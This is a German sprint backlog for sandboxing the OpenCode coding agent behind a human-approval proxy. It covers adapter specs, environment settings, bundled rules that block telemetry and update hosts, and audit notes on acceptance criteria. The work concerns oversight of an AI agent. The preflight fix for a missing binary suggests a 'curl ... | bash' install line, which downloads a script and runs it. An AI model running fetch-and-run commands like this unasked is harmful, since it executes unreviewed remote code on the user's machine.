# Sprint 3 · Agent Inside (M3)

> **Kästchen-Abgleich 2026-09-05.** Die Kästchen dieses Sprints wurden gegen den
> Code gemessen, nicht gegen die Erinnerung: je Issue wurde jedes Kriterium
> ausgeführt, wo es einen Befehl nennt, und sonst am Code belegt. Ergebnis: 32
> Kriterien waren erfüllt und standen offen, und **kein einziges** war abgehakt,
> ohne erfüllt zu sein. Der eine gegenteilige Verdacht wurde von einem zweiten,
> gegenläufig beauftragten Prüfer entkräftet.
>
> Zwei erfüllte Kriterien bleiben trotzdem offen, mit Grund:
>
> - HUM-067, „Terminal ist nach jedem Exit-Pfad wieder im Normalmodus": Die
>   Zusicherung gilt heute nur, weil die Kommandozeile den kanonischen Modus nie
>   verlässt. Sie bewacht den Rohmodus, den erst HUM-042 baut, und wäre bis
>   dahin ein Haken ohne Gegenstand.
> - HUM-066, „`extra_rw` verweigert den Start mit `CONFIG_003` in CLI und UI":
>   Gemessen ist die Kommandozeile, nicht die Oberfläche.
>
> Zwei Befunde aus demselben Lauf, die keine Kästchen betreffen und je ein
> eigenes Issue brauchen: `SessionSummary` (HUM-043, Teil b) wird ausschließlich
> aus Tests gebaut und läuft im Daemon nie; und die Nummer HUM-087 ist zweimal
> vergeben — ein Merge-Commit trägt sie für ein Backlog-Issue, während das
> Code-Issue dieses Sprints unter derselben Nummer bei null von acht Kriterien
> steht.


Ziel des Sprints: OpenCode läuft in der bwrap-Sandbox gegen einen LLM-Server im LAN. Das UI zeigt Terminal, Sandbox-Status und Isolation-Check. `humanitl run --profile llm-only` liefert im aktuellen Verzeichnis eine reine Inferenz-Instanz ohne UI. Jeder Fehlerpfad dieses Sprints liefert ein `Diagnostic` mit `why` und `fix`.

Voraussetzungen aus Sprint 0 bis 2: `humanitl-core` (HUM-004, HUM-063), `humanitl-config` (HUM-062), Sandbox-Launcher und Shim (HUM-011, HUM-012), Proxy-Kern und Hold-Queue (HUM-015, HUM-016), Regel-Engine (HUM-022), Findings (HUM-025), Recorder (HUM-026), gRPC-Server (HUM-018), CLI-Grundgerüst (HUM-064), Flutter-Shell und Intercept-Screen (HUM-019, HUM-020, HUM-028).

| Reihenfolge | ID | Titel | Größe |
|---|---|---|---|
| 1 | HUM-037 | AgentAdapter-Trait und OpenCode-Profil | M |
| 2 | HUM-071 | Agent-Briefing | S | HUM-037 |
| HUM-038 | Default-Regeln | S |
| 3 | HUM-039 | LLM-Passthrough-Regel und Endpoint-Test | M |
| 4 | HUM-073 | Meta-Endpoint `humanitl.internal` | M | HUM-039, HUM-072 |
| HUM-066 | Profile | M |
| 5 | HUM-040 | Sandbox-Screen | M |
| 6 | HUM-041 | Isolation-Check-Panel und Ring | L |
| 7 | HUM-042 | Terminal | XL |
| 8 | HUM-043 | `/work`-Härtung | XL |
| 9 | HUM-075 | `humanitl doctor` | M | HUM-064, HUM-063, HUM-041 |
| 10 | HUM-044 | Setup-Flow | XL |
| 11 | HUM-045 | TLS-Fehler-Erkennung | S |
| HUM-076 | LLM-Server finden | M | HUM-039, HUM-044 |
| HUM-068 | Geführte Diagnostics im Sandbox-Screen | XL |
| 12 | HUM-067 | `humanitl run` | XL |
| 13 | HUM-046 | Demo-Skript M3 | L |
| 14 | HUM-135 | Ein genanntes Kommando bekommt den Adapter nicht | M | HUM-037 |
| 15 | HUM-149 | curl lehnt die CA erst nach dem Handschlag ab, und der Proxy sieht es nicht | M | HUM-045 |
| 16 | HUM-151 | Der Fix für eine CA-Variable schreibt in `config.toml` | M | HUM-045 |

Demo-Ziel am Sprint-Ende (HUM-046): CI startet einen Ollama-Mock, `humanitl run --profile default` startet OpenCode, der erste Prompt geht per Passthrough ans Mock-LLM, der models.dev-Aufruf wird per Default-Regel geblockt, ein `webfetch` wird gehalten, per gRPC erlaubt, und die Antwort erscheint im Terminal-Stream.

---

> **Review-Korrekturen 2026-09-02** (gelten vor dem Text): HUM-042: ein schreibender Client, beliebig viele lesende (`read_only`), Geometrie des Schreibers, Leser letterboxed; `TERM_001` nur bei zweitem Schreiber. HUM-067: `--ask terminal` verweigert Vollbild-TUI-Agenten (`AgentAdapter::is_fullscreen_tui()` ist für OpenCode `true`) mit Diagnostic `CLI_002` und schlägt `--ask ui` oder `--ask none` vor; `--ask terminal` bleibt für `humanitl sandbox run -- <zeilenorientiertes Kommando>`.
>
> **Abgleich 2026-09-02**: Escape-Tests heißen `esc-N-<name>.sh`. Neue Issues HUM-071 (Agent-Briefing, nach HUM-037) und HUM-073 (Meta-Endpoint, nach HUM-039) sind unten angehängt; HUM-046 prüft zusätzlich Block mit Notiz (HUM-072). Bridges und seccomp-Familien kommen aus dem Profil (siehe Sprint 1 Abgleich).
>
> **Abgleich 2026-09-04** (Audit von 28 Agenten gegen den Code, 135 Widersprüche in den sieben offenen Issues, 59 blockierend): Die Größen von HUM-041 (L), HUM-042 (XL), HUM-043 (XL), HUM-044 (XL), HUM-046 (L), HUM-067 (XL) und HUM-068 (XL) sind nach Codelektüre berichtigt; jedes der sieben trägt einen Abschnitt „Stand (2026-09-04)" mit den blockierenden Widersprüchen, und die nachweislich falschen Stellen sind im Text selbst korrigiert. HUM-075 rückt vor HUM-044, weil es „Blockiert: HUM-044" erklärt und den `Doctor`-RPC hält, den der Setup-Flow braucht. Die Oberflächen-Hälften von HUM-038 und HUM-045 sind eigene Issues: HUM-105 (Schalter „Deaktivieren") und HUM-106 (TLS-Karte, `diagnosticsProvider`), beide in der Sprint-2-Tabelle von `BACKLOG.md`. Was in mehreren Issues zugleich falsch war: `Notice`, `detach` und `IsolationResult` gibt es in der Proto nicht (committet sind `Open` mit `read_only`, `close`, `CheckResult` als `SandboxEvent.check`); `SandboxRequest.Start` hat nur `profile`, `work_dir`, `work_mode`, `command`; `GetConfig`/`SetConfig` sind bis HUM-069 unimplementiert, und im Repository schreibt nichts `config.toml`; die Bereiche `PROJECT` und `SESSION` existieren im Register nicht, `SANDBOX_010..012` sind Starter-Fehler und `013..016` die Check-Codes; `humanitl run` startet bis HUM-067 nichts.

## HUM-037 · AgentAdapter-Trait und OpenCode-Profil
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-004, HUM-011, HUM-014, HUM-022, HUM-062 · Blockiert: HUM-038, HUM-039, HUM-067

### Kontext
Humanitl startet nicht irgendein Programm, sondern einen bekannten Agenten mit bekannten Eigenheiten. OpenCode braucht eine Provider-Konfiguration für einen OpenAI-kompatiblen Endpoint, holt beim Start ungefragt `https://models.dev/api.json`, prüft auf Updates über GitHub, lädt Provider-Pakete per npm nach und hat einen gehosteten `websearch`. All das muss vor dem ersten Start deterministisch gesetzt sein, sonst sieht der Nutzer als erste gehaltene Anfrage etwas, das er nicht ausgelöst hat (Usability-Review, BACKLOG.md Abschnitt 5). Das Trait `AgentAdapter` (CONVENTIONS.md 3.10, BACKLOG.md Abschnitt 6) ist der Erweiterungspunkt für weitere Agenten und wird hier zum ersten Mal implementiert.

### Ziel
Die Crate `humanitl-sandbox` enthält das Trait `AgentAdapter` und die Implementierung `OpenCodeAdapter`. Für eine `SessionContext` liefert der Adapter das Startkommando, die Umgebungsvariablen, die in der Sandbox anzulegenden Dateien (`opencode.json`, gebündelte `models.json`), seine Default-Regeln und die Passthrough-Regel. Der Daemon fügt beim Start einer Session diese Beiträge in den `LaunchPlan` ein. Ein Test startet die Sandbox mit dem Adapter gegen einen Fake-LLM und beobachtet, dass OpenCode ohne Netzwerkzugriff außer dem Passthrough bis zum Prompt kommt.

### Nicht-Ziel
Keine anderen Adapter (Aider, Codex, Claude Code kommen nach dem MVP, BACKLOG.md Abschnitt 9). Keine Permission-Bridge über `opencode serve` (Post-MVP). Keine Installation von OpenCode selbst: der Adapter setzt voraus, dass `opencode` im Host-`$PATH` liegt oder `agent.command` gesetzt ist; die Installationsanleitung liefert HUM-044 als Diagnostic.

### Betroffene Pfade
- `daemon/crates/sandbox/src/agent/mod.rs` (neu): Trait, `SessionContext`, Registry
- `daemon/crates/sandbox/src/agent/opencode.rs` (neu): `OpenCodeAdapter`
- `daemon/crates/sandbox/src/agent/opencode_models.rs` (neu): Einbettung der gebündelten `models.json` via `include_bytes!`
- `agents/opencode/opencode.json.tmpl` (neu): Template
- `agents/opencode/models.json` (neu): gebündelter Ersatz für `https://models.dev/api.json`
- `agents/opencode/README.md` (neu): Wie `models.json` erneuert wird
- `agents/opencode/update-models.sh` (neu)
- `daemon/crates/sandbox/tests/opencode_adapter.rs` (neu)
- `daemon/bin/humanitld/src/session.rs`: Adapter-Beiträge in `LaunchPlan` einfügen

### Spezifikation

Trait und Kontext (in `agent/mod.rs`):

```rust
/// Everything an adapter needs to know about the session it is asked to prepare.
pub struct SessionContext {
    pub session: SessionId,
    pub work_dir_host: PathBuf,          // host path of the project
    pub work_dir_sandbox: PathBuf,       // always "/work"
    pub llm: LlmConfig,                  // from humanitl-config
    pub agent_command_override: Option<Vec<OsString>>,   // config key agent.command
    pub proxy_port: u16,                 // 3128
    pub ca_path_sandbox: PathBuf,        // "/etc/humanitl/ca.crt"
    pub language: Language,              // en | de, for agent-visible banners
}

pub trait AgentAdapter: Send + Sync {
    fn id(&self) -> &'static str;
    fn command(&self, ctx: &SessionContext) -> Vec<OsString>;
    fn env(&self, ctx: &SessionContext) -> Vec<(String, String)>;
    fn files(&self, ctx: &SessionContext) -> Vec<SandboxFile>;
    fn default_rules(&self) -> Vec<Rule>;
    fn llm_passthrough(&self, llm: &LlmConfig) -> Rule;
    /// Host-side preflight. Must not touch the network. Returns diagnostics, empty = ok.
    fn preflight(&self, ctx: &SessionContext) -> Vec<Diagnostic>;
}

/// A file the daemon writes into the sandbox before exec (tmpfs-backed, never into /work).
pub struct SandboxFile { pub dst: PathBuf, pub content: Vec<u8>, pub mode: u32 }

pub struct AdapterRegistry { adapters: Vec<Box<dyn AgentAdapter>> }
impl AdapterRegistry {
    pub fn builtin() -> Self;                         // contains OpenCodeAdapter
    pub fn get(&self, id: &str) -> Option<&dyn AgentAdapter>;
    pub fn ids(&self) -> Vec<&'static str>;
}
```

Konkrete Werte für `OpenCodeAdapter`:

- `id()` = `"opencode"`.
- `command()`: bei `agent_command_override` genau dieses; sonst `["opencode"]`. Kein `--port`, kein `serve`. Das TUI läuft im PTY aus HUM-042.
- `env()` (zusätzlich zum Env-Kit aus HUM-014, das der Launcher setzt):

| Variable | Wert | Grund |
|---|---|---|
| `OPENCODE_DISABLE_AUTOUPDATE` | `true` | kein GitHub-Release-Check |
| `OPENCODE_MODELS_URL` | `file:///etc/humanitl/opencode/models.json` | ersetzt `https://models.dev/api.json`; falls OpenCode das Schema `file://` in der laufenden Version nicht akzeptiert, greift Fallstrick 1 |
| `OPENCODE_CONFIG` | `/etc/humanitl/opencode/opencode.json` | Konfig außerhalb von `/work`, damit der Agent sie nicht umschreibt |
| `OPENCODE_AUTO_SHARE` | `false` | kein Session-Sharing |
| `OPENCODE_ENABLE_EXA` | `false` | gehosteter Websearch aus |
| `OPENCODE_ENABLE_PARALLEL` | `false` | ebenso |
| `HOME` | `/home/agent` | tmpfs-Home, damit `~/.config/opencode` und `~/.local/share/opencode` nicht auf dem Host landen |
| `XDG_CONFIG_HOME` | `/home/agent/.config` | |
| `XDG_DATA_HOME` | `/home/agent/.local/share` | |
| `XDG_CACHE_HOME` | `/home/agent/.cache` | |
| `NODE_EXTRA_CA_CERTS` | `/etc/humanitl/ca.crt` | Bun/Node-Fetch vertraut der Proxy-CA |
| `TERM` | `xterm-256color` | |
| `COLORTERM` | `truecolor` | |
| `LANG` | `C.UTF-8` | |

- `files()`:
  1. `/etc/humanitl/opencode/opencode.json` (mode 0444) aus dem Template unten, mit `{{LLM_BASE_URL}}` = `llm.endpoint` plus `/v1` (falls der Endpoint nicht bereits auf `/v1` endet) und `{{MODELS}}` = Liste aus `llm.models` (Config, Default leer). Ist die Liste leer, wird ein Platzhalter-Modell `"default"` eingetragen und ein `Diagnostic` `LLM_004` (Warning) aus `preflight()` geliefert.
  2. `/etc/humanitl/opencode/models.json` (mode 0444) aus `include_bytes!("../../../../agents/opencode/models.json")`.
  3. `/home/agent/.config/opencode/.keep` (leer), damit das Verzeichnis existiert.

Template `agents/opencode/opencode.json.tmpl`:

```json
{
  "$schema": "https://opencode.ai/config.json",
  "provider": {
    "humanitl-local": {
      "npm": "@ai-sdk/openai-compatible",
      "name": "Humanitl local LLM",
      "options": {
        "baseURL": "{{LLM_BASE_URL}}"
      },
      "models": {{MODELS}}
    }
  },
  "model": "humanitl-local/{{DEFAULT_MODEL}}",
  "autoupdate": false,
  "share": "disabled",
  "permission": {
    "webfetch": "ask",
    "websearch": "deny",
    "external_directory": "deny"
  }
}
```

`{{MODELS}}` wird zu einem JSON-Objekt der Form `{"<name>": {"name": "<name>"}}` pro Modell. `{{DEFAULT_MODEL}}` ist das erste Modell der Liste.

- `default_rules()`: liefert die Regeln aus HUM-038 mit `bundled: true`. Der Adapter ist die einzige Quelle für diese Regeln; `rules/default.yaml` ist die Datei, die der Adapter per `include_str!` lädt.
- `llm_passthrough()`: siehe HUM-039, dort spezifiziert.
- `preflight()`:
  - `AGENT_001` (Blocking): `opencode` nicht im `$PATH` und kein Override. `fix: CopyCommand("curl -fsSL https://opencode.ai/install | bash")`, `docs: https://opencode.ai/docs/`.
  - `AGENT_002` (Warning): Override gesetzt, Binary nicht ausführbar.
  - `LLM_004` (Warning): keine Modelle konfiguriert, Platzhalter aktiv. `fix: ChangeSetting { key: "llm.models", value: "<aus Test-Button>" }`.

Gebündelte `models.json`: eine reduzierte Kopie des `models.dev`-Formats, die genau einen Provider `humanitl-local` mit den konfigurierten Modellen beschreibt. Da OpenCode diese Datei beim Start zwingend lädt, muss sie syntaktisch dem echten Schema entsprechen. `update-models.sh` lädt `https://models.dev/api.json` einmalig auf dem Host des Entwicklers (nie in der Sandbox), extrahiert das Schema-Skelett eines Providers und schreibt es als Vorlage; die Modell-Einträge werden zur Laufzeit vom Adapter eingesetzt (Template-Mechanismus identisch zu `opencode.json`). Das Skript ist Entwickler-Werkzeug, kein Laufzeitpfad.

Integration in `session.rs`:

```rust
let adapter = registry.get(&config.agent.adapter).ok_or(Diagnostic::agent_unknown(&config.agent.adapter))?;
let diags = adapter.preflight(&ctx);
if diags.iter().any(|d| d.severity == Severity::Blocking) { return Err(diags); }
plan.argv_agent = adapter.command(&ctx);
plan.env.extend(adapter.env(&ctx));
plan.files.extend(adapter.files(&ctx));
ruleset.prepend_bundled(adapter.default_rules());
ruleset.prepend_bundled(vec![adapter.llm_passthrough(&config.llm)]);
```

`LaunchPlan` bekommt das Feld `files: Vec<SandboxFile>`; der bwrap-Launcher (HUM-011) schreibt jede Datei per `--file FD DST` bzw. `--ro-bind-data FD DST` (bwrap unterstützt `--file` mit einem FD, der vor dem Aufruf befüllt wird).

### Schritte
1. `agent/mod.rs` mit Trait, `SessionContext`, `SandboxFile`, `AdapterRegistry` anlegen. `cargo build` grün.
2. `LaunchPlan.files` einführen, im bwrap-Launcher `--file`-Argumente erzeugen (FD über `memfd_create`, Inhalt schreiben, `lseek(0)`). Test: Datei erscheint mit Modus 0444 in der Sandbox.
3. Template und `models.json` unter `agents/opencode/` anlegen. `update-models.sh` schreiben und einmal ausführen, Ergebnis committen.
4. `opencode.rs` implementieren: `command`, `env`, `files` (Template-Rendering ohne externe Crate: `str::replace` für die drei Platzhalter reicht, JSON-Validität per `serde_json::from_str` im Test), `preflight`.
5. `default_rules()` über `include_str!` an `rules/default.yaml` binden (Datei kommt aus HUM-038; bis dahin leere Liste, Test wird in HUM-038 ergänzt).
6. `session.rs` verdrahten. Config-Schlüssel `agent.adapter` (Default `opencode`, Tier `advanced`), `agent.command` (Tier `expert`), `llm.models` (Tier `basic`, Liste von Strings) im Schema ergänzen.
7. Integrationstest `opencode_adapter.rs` (siehe Tests).

### Tests
- `opencode_env_contains_required_keys`: `env()` enthält alle Variablen der Tabelle mit exakt den Werten.
- `opencode_config_is_valid_json_and_points_to_llm`: `files()` liefert `opencode.json`, `serde_json` parst, `provider["humanitl-local"]["options"]["baseURL"] == "http://192.168.1.50:11434/v1"` bei `llm.endpoint = "http://192.168.1.50:11434"`.
- `opencode_config_appends_v1_only_once`: Endpoint `http://x:1/v1` ergibt `http://x:1/v1`, nicht `/v1/v1`.
- `opencode_models_placeholder_when_empty`: leere `llm.models` ⇒ Modell `default`, `preflight` enthält `LLM_004`.
- `opencode_preflight_missing_binary`: `$PATH` ohne `opencode`, kein Override ⇒ `AGENT_001` mit `Severity::Blocking`.
- `opencode_default_rules_are_bundled`: alle Regeln aus `default_rules()` haben `bundled == true`.
- Integration (benötigt bwrap, markiert `#[ignore]` ohne Feature `escape`): Sandbox mit Adapter starten, Kommando durch `sh -c 'cat /etc/humanitl/opencode/opencode.json; env | grep OPENCODE_'` ersetzen, Ausgabe enthält `humanitl-local` und `OPENCODE_DISABLE_AUTOUPDATE=true`.
- Integration mit echtem OpenCode (nur lokal, `#[ignore]`): Start gegen Fake-LLM, innerhalb von 20 s erscheint der TUI-Prompt im PTY, kein Flow außer Passthrough im Recorder.

### Akzeptanzkriterien
- [x] `cargo test -p humanitl-sandbox` grün, alle oben genannten Tests vorhanden — **bis auf einen, und der steht woanders.** Nachgezählt am 2026-09-12 in `daemon/crates/sandbox/tests/opencode_adapter.rs`: Die sechs Unit-Tests der Liste stehen dort (Zeilen 56, 106, 150, 161, 191, 636), der erste Integrationstest heißt `the_adapter_files_arrive_in_a_real_sandbox_and_the_guarantees_hold` (Zeile 817) und trägt absichtlich kein `#[ignore]` und kein Feature `escape`, sondern überspringt sich selbst ohne `bwrap` (Begründung in den Zeilen 811 bis 815). Der zweite Integrationstest, echtes OpenCode gegen den Fake-LLM, ist nie in diese Crate gekommen: Die Datei enthält kein `#[ignore]`, und `daemon/crates/sandbox/Cargo.toml` hat keinen Abschnitt `[features]`, also weder `escape` noch `agent-e2e`. Er läuft seit dem 2026-09-07 als Schritt 13 des M3-Laufs (`tests/e2e/m3_agent_inside/run.sh`, in HUM-046 `m3_real_opencode` genannt) und misst dort mehr als der geplante Test: Modellauswahl, Verkehr nur über die Durchreiche, kein Katalogabruf, kein gehaltener Fluss. Ob das Kommando grün ist, sagt nur ein Lauf; hier wurde gezählt, nicht gebaut.
- [x] `humanitl sandbox argv --profile default` zeigt die `--file`-Einträge für `opencode.json` und `models.json`.
- [x] `humanitl config schema | jq '.properties.agent'` zeigt `adapter` und `command` mit Tier und Beschreibung.
- [x] Manuell: OpenCode startet in der Sandbox, `opencode` zeigt den Provider `Humanitl local LLM` in der Modellauswahl. **Beide Hälften sind seit dem 2026-09-07 belegt.** Das echte OpenCode startet in der Sandbox und benutzt den Anbieter: Im M3-Lauf steht `Build · mock Humanitl local LLM` im Transkript, also das Modell dieser Sitzung aus `humanitl-local`, und der Verkehr geht über die Durchreiche ans lokale Modell (HUM-046, Schritt 13, `M3 demo: OK`; die Zahl der Zusicherungen wandert mit dem Lauf und steht dort, nicht hier). Die **Auswahl** ist seitdem beides: gemessen und gesehen. Gemessen im Lauf, weil `opencode models` die Liste ohne TUI ausgibt -- zwei Zusicherungen in `tests/e2e/m3_agent_inside/run.sh` (Schritt 13): Die erste Zeile lautet `humanitl-local/mock`, und es gibt genau eine Zeile, also steht kein anderer Anbieter darin. Gesehen am 2026-09-07 vom Nutzer in der Oberfläche, mit einem echten OpenCode in der Sandbox: „Aber ja da steht humanitl local llm". Der Lauf misst die Kennung `humanitl-local`, der Mensch hat den Anzeigenamen `Humanitl local LLM` gelesen; die Verbindung zwischen beidem hält `daemon/crates/sandbox/tests/opencode_adapter.rs`, das den Namen in der erzeugten `opencode.json` prüft.
- [x] Manuell: Kein gehaltener Flow zu `models.dev` oder `api.github.com` beim Start (wird in HUM-038 automatisiert). **Gemessen am 2026-09-07, und nicht mehr von Hand:** Der M3-Lauf startet das echte OpenCode in der Sandbox und prüft danach drei Dinge, die zusammen genau das sagen — `never asked the model catalogue host its documentation names` (`models.dev`), `nor the one the installed version really uses` (`models.opencode.ai`) und `left nothing waiting for a human` (`state:held` ist null). Und `and never asked GitHub for a release either` zählt `host:api.github.com` vor und nach der Sitzung: Der Agent fragt dort beim Start nichts. Die dritte Zusicherung (`state:held` ist null) sagt in diesem Lauf für sich genommen wenig — mit `--ask none` ist die Frist null, und ein gehaltener Fluss entsteht gar nicht erst; sie steht als Wächter dafür, dass sich das nicht ändert.

### Fallstricke
1. **`OPENCODE_MODELS_URL` und `file://`.** Ob OpenCode `file://` akzeptiert, hängt von der Version ab. Falls nicht: der Daemon startet einen zweiten Unix-Socket-Listener, der nur `GET /api.json` mit der gebündelten Datei beantwortet, und der Adapter setzt `OPENCODE_MODELS_URL=http://127.0.0.1:3129/api.json`; der Shim öffnet die zweite socat-Bridge auf Port 3129. Das ist im Sandbox-Modell erlaubt, weil es derselbe Mechanismus wie der Proxy-Socket ist. Test: `curl http://127.0.0.1:3129/api.json` in der Sandbox liefert die Datei. Entscheidung wird beim ersten echten Start getroffen und als Kommentar im Adapter dokumentiert.
2. **npm-Nachladen des Provider-Pakets.** OpenCode installiert `@ai-sdk/openai-compatible` beim ersten Gebrauch nach `~/.cache/opencode`. Das erzeugt gehaltene Flows zu `registry.npmjs.org`. Zwei Optionen: (a) Default-Regel `ask` für `registry.npmjs.org` (HUM-038), der Nutzer sieht einen erklärbaren Flow; (b) Paket vorinstallieren in ein Cache-Volume. MVP macht (a) und zeigt in der Katalog-Karte „npm registry · typisch für Provider-Installation". Das Home ist tmpfs, also wird bei jedem Start neu geladen; ein persistentes Cache-Volume unter `$XDG_DATA_HOME/humanitl/cache/<projekt-hash>/opencode` wird als `rw`-Mount nach `/home/agent/.cache/opencode` eingehängt (Profil-Schlüssel `mounts.cache = true`, Default `true`).
3. **Bun und CA.** Bun ab 1.1.22 liest `NODE_EXTRA_CA_CERTS`, ältere Versionen nicht. OpenCode-Binaries bündeln Bun. Wenn TLS gegen den Proxy fehlschlägt, greift HUM-045 mit `TLS_002`.
4. **Config-Pfad.** Wenn `OPENCODE_CONFIG` nicht respektiert wird, fällt OpenCode auf `~/.config/opencode/opencode.json` zurück. Der Adapter legt die Datei deshalb zusätzlich dort ab (Schritt 4, zwei Ziele, gleicher Inhalt).
5. **Template-Injection.** `llm.endpoint` und Modellnamen kommen aus der Config und landen in JSON. Modellnamen mit `"` müssen per `serde_json::to_string` escaped werden; das Template wird deshalb nicht per String-Replace, sondern durch Parsen des Templates als `serde_json::Value` und Setzen der Felder gerendert. Die Platzhalter im Template sind nur Dokumentation für Menschen.
6. **`--file` in bwrap** nimmt den FD-Inhalt, nicht einen Pfad. Der FD muss vor `exec` von bwrap offen bleiben; `CLOEXEC` darf nicht gesetzt sein.

### Referenzen
BACKLOG.md 3.2, 6, 9 (Punkt 6); ADR-002; CONVENTIONS.md 3.4, 3.10. OpenCode Providers (https://opencode.ai/docs/providers/), Permissions (https://opencode.ai/docs/permissions/), Network (https://opencode.ai/docs/network/), Ollama-Integration (https://docs.ollama.com/integrations/opencode), Issue zu Offline-Betrieb (https://github.com/anomalyco/opencode/issues/16117), bwrap Manpage `--file` (https://manpages.debian.org/trixie/bubblewrap/bwrap.1.en.html).

---

## HUM-038 · Default-Regeln
Sprint: 3 · Größe: S · Abhängigkeiten: HUM-022, HUM-037 · Blockiert: HUM-046

### Kontext
Beim ersten Start darf der Nutzer keine Flut ungefragter Anfragen sehen. Die Recherche (BACKLOG.md Abschnitt 10, Risiko „OpenCode telefoniert nach Hause") nennt die Hosts. Default-Regeln werden als `bundled` markiert, erscheinen im Rules-Screen mit Badge und sind vom Nutzer deaktivierbar, aber nicht löschbar.

### Ziel
`rules/default.yaml` existiert, wird vom `OpenCodeAdapter` geladen und beim Session-Start vor die Nutzerregeln gestellt. Ein Test misst: Anzahl gehaltener Flows zwischen Sandbox-Start und erstem Nutzer-Prompt ist höchstens 1.

### Nicht-Ziel
Keine Regeln für andere Agenten. Keine Regel-UI-Änderungen (HUM-033 hat das Bundled-Badge bereits vorgesehen).

### Betroffene Pfade
- `rules/default.yaml` (neu)
- `daemon/crates/sandbox/src/agent/opencode.rs`: `default_rules()` lädt die Datei
- `daemon/crates/rules/src/lib.rs`: `RuleSet::prepend_bundled`, Flag `disabled` pro Regel
- `daemon/crates/sandbox/tests/startup_noise.rs` (neu)

### Spezifikation

`rules/default.yaml`, vollständig:

```yaml
# Bundled default rules for the OpenCode adapter.
# Loaded before user rules. First match wins. Users may disable but not delete these.
version: 1
rules:
  - id: 01920000-0000-7000-8000-000000000001
    action: block
    match: { host: "models.dev" }
    expires: never
    bundled: true
    note: "OpenCode fetches its model catalog from models.dev on every start. Humanitl ships a bundled copy; the network call is unnecessary."

  - id: 01920000-0000-7000-8000-000000000002
    action: block
    match: { host: "api.github.com", path: "/repos/anomalyco/opencode/releases/**" }
    expires: never
    bundled: true
    note: "Update check. Disabled via OPENCODE_DISABLE_AUTOUPDATE; this rule is the second lock."

  - id: 01920000-0000-7000-8000-000000000003
    action: block
    match: { host: "**.posthog.com" }
    expires: never
    bundled: true
    note: "Product analytics endpoint used by several agent CLIs."

  - id: 01920000-0000-7000-8000-000000000004
    action: block
    match: { host: "**.sentry.io" }
    expires: never
    bundled: true
    note: "Crash reporting. Would carry stack traces including file paths."

  - id: 01920000-0000-7000-8000-000000000005
    action: block
    match: { host: "opencode.ai", path: "/share/**" }
    expires: never
    bundled: true
    note: "Session sharing uploads the whole conversation. Disabled by config; rule is the second lock."

  - id: 01920000-0000-7000-8000-000000000006
    action: block
    match: { host: "**.exa.ai" }
    expires: never
    bundled: true
    note: "Hosted web search backend for OpenCode's websearch tool."

  - id: 01920000-0000-7000-8000-000000000007
    action: block
    match: { host: "**.parallel.ai" }
    expires: never
    bundled: true
    note: "Hosted web search backend (Parallel)."

  - id: 01920000-0000-7000-8000-000000000008
    action: ask
    match: { host: "registry.npmjs.org", method: [GET, HEAD] }
    expires: never
    bundled: true
    note: "OpenCode installs provider packages on first use. Shown as a normal held request so the user learns what it is."
```

Regel-Engine-Erweiterung: `Rule.disabled: bool` (Default `false`, wird in `rules.yaml` des Nutzers als Override `disabled_bundled: [<id>, ...]` persistiert, nicht in `default.yaml`). `RuleSet::evaluate` überspringt `disabled` Regeln. `RuleSet::prepend_bundled(rules)` fügt vorne ein und setzt `bundled = true` erzwungen.

Metrik-Test: Sandbox-Start mit OpenCode-Adapter gegen Fake-LLM (HUM-046 liefert den Mock, für diesen Test reicht ein axum-Server, der `/v1/models` und `/api/tags` mit einem Modell beantwortet). Der Test wartet 15 s oder bis das PTY den Prompt-Marker zeigt, zählt dann `flows` mit `state == Held` oder `Decided(Block { reason: Rule(_) })`. Erwartung: `held <= 1` (der npm-Ask), `blocked_by_rule` beliebig.

### Schritte
1. `rules/default.yaml` anlegen. `humanitl rules test https://models.dev/api.json` (HUM-065) liefert `block · bundled`.
2. `disabled`-Flag und `disabled_bundled`-Override in `humanitl-rules` ergänzen, Tests.
3. `OpenCodeAdapter::default_rules()` via `include_str!` und `serde_yaml`. Ladefehler ist ein Panic beim Daemon-Start (die Datei ist Teil des Builds, nicht Nutzereingabe): Test stellt sicher, dass sie parst.
4. Metrik-Test schreiben, `#[ignore]` ohne Feature `agent-e2e`.

### Tests
- `default_rules_parse`: Datei parst, 8 Regeln, alle `bundled`.
- `default_rules_match_table`: `models.dev` ⇒ block; `api.github.com /repos/anomalyco/opencode/releases/latest` ⇒ block; `api.github.com /repos/foo/bar` ⇒ Default (ask); `eu.posthog.com` ⇒ block; `registry.npmjs.org GET` ⇒ ask, `POST` ⇒ Default (ask, aber ohne Regel-Treffer).
- `disabled_bundled_is_skipped`: Override deaktiviert Regel 1 ⇒ `models.dev` ⇒ Default.
- `startup_noise_budget` (ignore-Feature): `held <= 1`.

### Akzeptanzkriterien
- [x] `humanitl rules list` zeigt die Regeln mit `bundled`. **Zwei Angaben des Kriteriums sind überholt, gemessen am 2026-09-06 gegen einen laufenden Daemon:** Es sind **zehn** statt acht — der Adapter aus HUM-037 bringt `models.opencode.ai` und `opencode.ai/share/**` mit —, und sie stehen **hinter** den Nutzerregeln statt davor. Die Reihenfolge ist die spätere Entscheidung aus HUM-027 und steht in `backlog/CONVENTIONS.md` 4.5: Durchreiche zum Sprachmodell, Sitzungsregeln, Nutzerregeln, mitgelieferte. Eine eigene Regel muss eine mitgelieferte überstimmen können, ohne sie zu löschen. Gemessen: `humanitl rules list` sagt „no rules of your own; 10 bundled rules also apply", `--all` zeigt sie mit Herkunft `bundled` auf den Positionen 1 bis 10, und eine eigene Regel erscheint als eigene Gruppe darüber.
- [x] Rules-Screen zeigt Badge „Bundled" und „Deaktivieren" statt „Löschen" für diese Regeln. Abzeichen, Schloss, eigener Block und der fehlende Papierkorb stehen; den Schalter „Deaktivieren" hat die Oberflächen-Hälfte HUM-105 nachgeliefert (gemergt als `8953dc8`). Nachgesehen am 2026-09-12: `disabled` in `app/lib/core/domain/rule.dart:83`, die Zeile in `app/lib/core/ipc/convert.dart:459`, `setRuleDisabled` in `DaemonClient`, `GrpcDaemonClient` und `FakeDaemonClient`, `_DisableSwitch` in `app/lib/features/rules/widgets/rule_row.dart:269`.
